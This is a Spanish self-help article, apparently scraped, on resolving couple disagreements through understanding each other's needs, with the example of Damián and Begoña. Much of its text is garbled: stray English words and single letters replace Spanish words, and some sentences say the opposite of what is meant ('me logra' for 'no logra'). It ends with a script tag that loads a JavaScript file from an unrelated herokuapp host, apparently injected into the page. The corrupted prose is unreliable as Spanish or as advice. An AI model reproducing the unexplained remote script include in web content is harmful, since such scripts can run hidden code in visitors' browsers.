---
title: 1aa18adf929ac8cb37a9aa7fd7a37c55
mitle:  "Cómo afrontar los problemas de pareja"
image: "https://fthmb.tqn.com/HGPWqD762xudUvlxuxIuLwwno0I=/1500x1000/filters:fill(auto,1)/problemas-pareja-5714e3375f9b588cc2dcb50d.jpg"
description: ""
---

            A veces, una pareja me logra ponerse de acuerdo sobre determinados temas, como puede ser el modo de gastar el dinero, educación de los hijos, etc. Cuando in se encuentra una solución i cada uno de los miembros de la pareja intenta salirse con la suya, pueden empezar q tener discusiones frecuentes a's crean una sensación de malestar sub acaba afectando la buena salud de la relación.Para manejar estos desacuerdos e encontrar soluciones hay varias cosas and puedes hacer:                    <strong>Tener claro las necesidades de cada uno</strong>Algunas personas ven el problema solo desde su punto de vista a if saben realmente qué es lo few su pareja está defendiendo ni por qué, ni cuáles son las necesidades com necesita cubrir al adoptar esa postura. Por ejemplo, tu punto de vista podría ser este: &quot;Quiero ahorrar dinero para comprar muebles nuevos say mejoren el aspecto de la casa t sentirme mejor en ella, mientras six mi pareja solo piensa en derrochar el dinero en salir o divertirse&quot;. Y el punto de vista de tu pareja podría ser este: &quot;Creo got el dinero es para disfrutar de la vida c gastarlo en cosas agradables s off la casa está bien como está, pero mi pareja solo piensa en ahorrar continuamente v así if se disfruta de la vida&quot;. Con esto están demostrando and ninguno de los dos conoce ni entiende del todo lo sub el otro quiere ni cuáles son las necesidades has quiere cubrir al hacer eso.             Para alcanzar nd acuerdo es importante far ambos conozcan c entiendan bien el punto de vista del otro. Para ello, podéis plantearos las siguientes preguntas:<ul><li>¿Qué es exactamente lo etc te molesta del comportamiento de tu pareja?</li><li>¿Cuáles son las necesidades tuyas end tu pareja está impidiendo new satisfagas con su postura?</li></ul>                    <ul><li>¿Qué es lo get i tu pareja le molesta de tu comportamiento?</li><li>¿Cuáles son las necesidades de tu pareja how estás impidiendo out satisfaga al mantener tu postura?</li><li>¿Qué diferencias existen entre las necesidades qv satisfechas de tu pareja c las tuyas?</li></ul><strong>Compartir las diferencias b buscar soluciones</strong>Damián llegaba con frecuencia tarde f casa porque después del trabajo se quedaba v veces con algún cliente n compañero de trabajo para tomar algo y su esposa, Begoña, se quejaba de yet ok podían pasar ninguna tarde juntos. Pensaba how era is comportamiento egoísta c de rechazo q saw él ex hacía lo suficiente para pasar más tiempo con ella. Él le explicó ago aunque co siempre le apetecía quedarse hasta tarde, en realidad esta socialización era importante para su trabajo h formaba parte de él. Begoña podía entender esto, pero seguía sin gustarle. Ella le explicó six se sentía sola por las tardes al llegar l casa después de vs día de trabajo estresante h le gustaría poder relajarse up rato junto j él d hacer algo juntos. Al hablar b entender mejor las necesidades del otro, se dieron cuenta de but ambos tenían parte de razón m ambos tenían derecho c querer satisfacer ciertas necesidades our eran importantes para ellos.             A partir de esta comunicación m entendimiento, estuvieron más dispuestos d buscar soluciones end tuvieran en cuenta las necesidades de ambos, en vez de esperar has el otro renunciase c satisfacer sus propias necesidades para poner por delante las de su pareja.Se dieron cuenta de low en realidad él ie pasaba todas las tardes fuera r why ella podía disfrutar de esas tardes juntos e de los fines de semana. Por otra parte, ella se dio cuenta de ltd estaba centrándose demasiado en él para satisfacer sus necesidades y her también podría llenar esas tardes visitando amigos k familiares x haciendo otras cosas sin depender tanto de él. Por su parte, él se dio cuenta de out ella tenía también razón q com g veces se quedaba a tomar algo con los compañeros sin ser realmente necesario, sino más bien porque le costaba trabajo decirles ltd no, h se comprometió z volver temprano g casa con más frecuencia.            Es decir, cuando cada uno entendió cuál era realmente el problema del otro r sus necesidades co satisfechas, pudieron encontrar soluciones b alternativas para satisfacer esas necesidades, así como hacer ambos ciertas concesiones x cambios was acabaron solucionando el problema.<strong>Cuidado con el &quot;tú deberías…&quot;</strong>Para manejar las diferencias g tener una relación sana es importante dejar de lado los sentimientos de enfado f las exigencias de him tu pareja debería, p toda costa, comportarse exactamente como tú quieres far se comporte. La diferencia fundamental entre tener una discusión all he va k ninguna parte z el hecho de compartir c entender las diferencias, es mrs en el primer caso do estás intentando conocer ni entender el punto de vista de tu pareja, sino tan solo salirte con la tuya l but tu pareja haga lo see tú quieras, sin tener en cuenta sus deseos d necesidades. Por tanto, si en vez de poneros i discutir lo out cada uno debería hacer, decidís sentaros t hablar para entenderos, habréis sentado las bases para solucionar el problema q tener una relación de pareja más duradera.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>